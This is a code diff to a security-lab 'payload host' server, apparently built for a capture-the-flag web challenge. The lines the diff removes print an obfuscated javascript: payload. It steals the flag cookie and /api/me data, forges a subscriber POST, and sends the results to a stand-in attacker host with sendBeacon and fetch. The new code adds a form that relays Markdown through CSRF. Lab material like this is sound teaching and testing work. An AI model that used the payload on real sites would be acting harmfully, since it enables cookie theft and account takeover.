@@ -19,86 +19,54 @@ function escapeAttribute(value) {
   return escapeHtml(value).replaceAll("\n", "&#10;").replaceAll("\r", "&#13;");
 }
 
-function webhookFromQuery(value) {
-  if (!value) {
-    return "http://attacker:4000/collect";
+function firstQueryValue(value) {
+  if (Array.isArray(value)) {
+    return value[0];
   }
-
-  let parsed;
-  try {
-    parsed = new URL(value);
-  } catch {
-    return null;
-  }
-
-  if (!["http:", "https:"].includes(parsed.protocol)) {
-    return null;
-  }
-
-  return parsed.toString();
+  return value;
 }
 
-function buildPayload(webhook) {
-  const payload = `
-void (async () => {
-  const flagCookie = document.cookie
-    .split("; ")
-    .find((part) => part.startsWith("flag=")) || "";
-  const flag = flagCookie.startsWith("flag=") ? flagCookie.slice("flag=".length) : "";
-  let me = null;
-
-  try {
-    me = await fetch("/api/me", { credentials: "same-origin" }).then((response) => response.json());
-  } catch (error) {
-    me = { error: "api-me-failed" };
-  }
-
-  try {
-    await fetch("/api/conversations/latest/subscribers", {
-      method: "POST",
-      credentials: "same-origin",
-      headers: { "content-type": "application/json" },
-      body: JSON.stringify({ email: "attacker@example.test" })
+function labFormPage(message = "") {
+  const escapedMessage = message ? `<p>${escapeHtml(message)}</p>` : "";
+  return `<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Payload Host</title>
+</head>
+<body>
+  <h1>Payload Host</h1>
+  ${escapedMessage}
+  <p>This page only relays a supplied Markdown greeting through CSRF when the greeting query is present.</p>
+  <form id="builder">
+    <p><label>greeting <textarea name="greeting" rows="6" cols="80"></textarea></label></p>
+    <p><label>report URL <input id="report-url" size="100" readonly></label></p>
+    <button type="button" id="build">Build report URL</button>
+  </form>
+  <p><a href="/loot">/loot</a></p>
+  <script>
+    document.getElementById("build").addEventListener("click", () => {
+      const greeting = document.querySelector("[name=greeting]").value;
+      document.getElementById("report-url").value = location.origin + "/lab?greeting=" + encodeURIComponent(greeting);
     });
-  } catch (error) {
-  }
-
-  const body = JSON.stringify({
-    cookie: flagCookie,
-    flag,
-    me
-  });
-
-  try {
-    if (navigator.sendBeacon && navigator.sendBeacon(${JSON.stringify(webhook)}, body)) {
-      return;
-    }
-  } catch (error) {
-  }
-
-  try {
-    await fetch(${JSON.stringify(webhook)}, {
-      method: "POST",
-      mode: "no-cors",
-      body
-    });
-  } catch (error) {
-  }
-})();
-`;
-
-  return `javascript:eval(atob('${Buffer.from(payload, "utf8").toString("base64")}'))`;
+  </script>
+</body>
+</html>`;
 }
 
 app.get("/lab", (req, res) => {
-  const webhook = webhookFromQuery(req.query.webhook);
-  if (!webhook) {
-    res.status(400).type("text/plain").send("invalid webhook URL");
+  const greeting = firstQueryValue(req.query.greeting);
+
+  if (!greeting) {
+    res.type("html").send(labFormPage("Missing greeting. Build your own Markdown payload first."));
     return;
   }
 
-  const href = buildPayload(webhook);
-  const greeting = `[open details](${href})`;
+  if (String(greeting).length > 6000) {
+    res.status(400).type("text/plain").send("greeting too long");
+    return;
+  }
+
   const appOrigin = req.hostname === "attacker.security-lab.test"
     ? "http://app.security-lab.test:3000"
     : "http://app:3000";
